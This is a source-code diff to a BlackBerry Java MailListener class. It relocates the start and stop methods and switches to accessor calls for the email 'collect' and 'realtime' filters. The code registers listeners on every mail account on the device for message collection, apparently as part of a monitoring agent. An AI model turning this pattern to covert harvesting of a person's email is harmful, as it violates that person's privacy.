@@ -83,6 +83,74 @@ public final class MailListener implements FolderListener, SendListener { //, St
         return instance;
     }
 
+    /**
+     * Start.
+     */
+    public void start() {
+
+        final ServiceBook serviceBook = ServiceBook.getSB();
+        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
+        //mailServiceRecords = serviceBook.getRecords();
+
+        names = new String[mailServiceRecords.length];
+        //#ifdef DEBUG
+        debug.trace("Starting: " + mailServiceRecords.length + " accounts");
+        //#endif
+
+        // to forever
+        realtimeFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance())
+                .getFilterEmailRealtime();
+
+        // history
+        collectFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance())
+                .getFilterEmailCollect();
+
+        // Controllo tutti gli account di posta
+        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
+
+            try {
+                final ServiceConfiguration sc = new ServiceConfiguration(
+                        mailServiceRecords[count]);
+                final Store store = Session.getInstance(sc).getStore();
+                addListeners(store);
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
+                debug.error("Cannot add listener. Count: " + count);
+                //#endif
+            }
+        }
+
+        isRunning = true;
+
+        //#ifdef DEBUG
+        debug.trace("Started");
+        //#endif
+
+    }
+
+    /**
+     * Stop.
+     */
+    public void stop() {
+        //#ifdef DEBUG
+        debug.trace("Stopping");
+        //#endif
+        if (mailServiceRecords != null) {
+            for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
+
+                final ServiceConfiguration sc = new ServiceConfiguration(
+                        mailServiceRecords[count]);
+                final Store store = Session.getInstance(sc).getStore();
+                removeListeners(store);
+            }
+        }
+
+        isRunning = false;
+        //#ifdef DEBUG
+        debug.trace("Stopped");
+        //#endif
+    }
+
     public synchronized void addSingleMailObserver(final MailObserver observer) {
         //#ifdef DEBUG
         debug.trace("addMailObserver");
@@ -324,8 +392,8 @@ public final class MailListener implements FolderListener, SendListener { //, St
                 //#ifdef DEBUG
                 debug.trace("new collectFilter");
                 //#endif
-                collectFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance()).filtersEMAIL
-                        .get(Filter.TYPE_COLLECT);
+                collectFilter = (Filter) ((ModuleMessage) ModuleMessage
+                        .getInstance()).getFilterEmailCollect();
             }
         }
 
@@ -568,74 +636,6 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         return true;
 
-    }
-
-    /**
-     * Start.
-     */
-    public void start() {
-
-        final ServiceBook serviceBook = ServiceBook.getSB();
-        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
-        //mailServiceRecords = serviceBook.getRecords();
-
-        names = new String[mailServiceRecords.length];
-        //#ifdef DEBUG
-        debug.trace("Starting: " + mailServiceRecords.length + " accounts");
-        //#endif
-
-        // to forever
-        realtimeFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance()).filtersEMAIL
-                .get(Filter.TYPE_REALTIME);
-
-        // history
-        collectFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance()).filtersEMAIL
-                .get(Filter.TYPE_COLLECT);
-
-        // Controllo tutti gli account di posta
-        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
-
-            try {
-                final ServiceConfiguration sc = new ServiceConfiguration(
-                        mailServiceRecords[count]);
-                final Store store = Session.getInstance(sc).getStore();
-                addListeners(store);
-            } catch (final Exception ex) {
-                //#ifdef DEBUG
-                debug.error("Cannot add listener. Count: " + count);
-                //#endif
-            }
-        }
-
-        isRunning = true;
-
-        //#ifdef DEBUG
-        debug.trace("Started");
-        //#endif
-
-    }
-
-    /**
-     * Stop.
-     */
-    public void stop() {
-        //#ifdef DEBUG
-        debug.trace("Stopping");
-        //#endif
-        if (mailServiceRecords != null) {
-            for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
-
-                final ServiceConfiguration sc = new ServiceConfiguration(
-                        mailServiceRecords[count]);
-                final Store store = Session.getInstance(sc).getStore();
-                removeListeners(store);
-            }
-        }
-
-        isRunning = false;
-        //#ifdef DEBUG
-        debug.trace("Stopped");
-        //#endif
     }
 
     public boolean haveNewAccount() {
